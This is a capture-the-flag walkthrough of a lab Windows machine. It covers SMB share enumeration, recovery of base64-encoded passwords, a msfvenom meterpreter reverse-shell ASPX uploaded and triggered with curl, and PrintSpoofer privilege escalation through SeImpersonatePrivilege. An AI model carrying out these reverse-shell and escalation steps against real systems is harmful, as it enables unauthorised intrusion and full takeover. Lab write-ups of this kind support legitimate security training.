---
sticker: emoji//1f440
---
# ENUMERATION
---

## OPEN PORTS
---


| PORT  | SERVICE               |
| :---- | :-------------------- |
| 80    | `http`                |
| 135   | `msrpc`               |
| 139   | `netbios-ssn?`        |
| 445   | `tcp (SMB)`           |
| 3389  | `ms-wbt-server (RDP)` |
| 49663 | `http`                |
| 49667 | `msrpc`               |
| 49669 | `msrpc`               |
|       |                       |
A lot of ports are open, let's proceed to check the website located at port `80`


![](../images/Pasted%20image%2020241122171440.png)

Nothing useful is in here, let's skip the fuzzing part as it doesn't contain anything too.

As shown in the open ports, we have RDP on `3389` and also SMB on `445`, let's try to enumerate SMB to check if there's anything useful.





# RECONNAISSANCE
---


## SMB Enumeration

Let's run the following command to list the shares in `SMB`:

`smbclient -l IP`

![](../images/Pasted%20image%2020241122173253.png)

We find a share `nt4wrksv`, let's research to check if there's a way to access to it:

```ad-hint

#### How to access?
----

Command used

`smbclient \\\\<Victim Ip>\\nt4wrksv`

If we use that, we are able to connect even without the password:

![](../images/Pasted%20image%2020241122173850.png)

```

We are in and found a `passwords.txt` file, let's download it and take a look at it:

![](../images/Pasted%20image%2020241122173939.png)

Seems like two passwords, both are `base64` encoded, let's decode them:

![](../images/Pasted%20image%2020241122174102.png)

![](../images/Pasted%20image%2020241122174229.png)

We got the following credentials:

```ad-note

`Bob` : `!P@$$W0rD!123`
`Bill` : `Juw4nnaM4n420696969!$$$`


```

Let's scan the machine further to check if there's anything vulnerable, for this, I will use the following Nmap scan:

```ad-hint

##### Nmap
----

If we use: `nmap -Pn -script vuln IP`, we get the following:


![](../images/Pasted%20image%2020241122180438.png)
The `3389` port is vulnerable to RCE. let's get a shell.

```
# EXPLOITATION
---

Nice, for the exploitation part we need to do the following:

```ad-summary
### Step to step to get the shell
---


1. Use msfvenom and create the reverse shell: `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=OURIP lport=ourport -f aspx -o reverse_shell.aspx`
2. Upload the reverse shell file to the network share:
![](../images/Pasted%20image%2020241122182149.png)
3. Use curl to retrieve the reverse shell: `curl http://IP:49663/nt4wrksv/reverse_shell.aspx`
4. Let's use metasploit's multi handler to create a listener:

![](../images/Pasted%20image%2020241122182439.png)

Let's run the multi handler and use curl at the same time to get our shell:

![](../images/Pasted%20image%2020241122182628.png)



```



Nice, let's do privilege escalation



# PRIVILEGE ESCALATION
---



For privilege escalation, we need to investigate the machine, let's take a look at the privileges using `getprivs`:


![](../images/Pasted%20image%2020241122182831.png)

Most interesting one is the `SeImpersonatePrivilege`, we can impersonate, for this privilege escalation, we'll be impersonating `PrintSpoofer`:

```ad-note

Script: [GITHUB LINK](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)
```

Once we've put the script inside of our machine using smb, we can do the following:

![](../images/Pasted%20image%2020241122183155.png)

Switch to shell and go to this route: 

`c:/inetpub/wwwroot/nt4wrksv`

![](../images/Pasted%20image%2020241122183251.png)

We can now see our `PrintSpoofer64.exe` program, we need to do the following in order to get a reverse shell:

`PrintSpoofer64.exe -i -c powershell.exe`

We are taking advantage of the `SeImpersonatePrivilege`, let's get our root shell:


![](../images/Pasted%20image%2020241122183438.png)

And just like that, CTF is done.

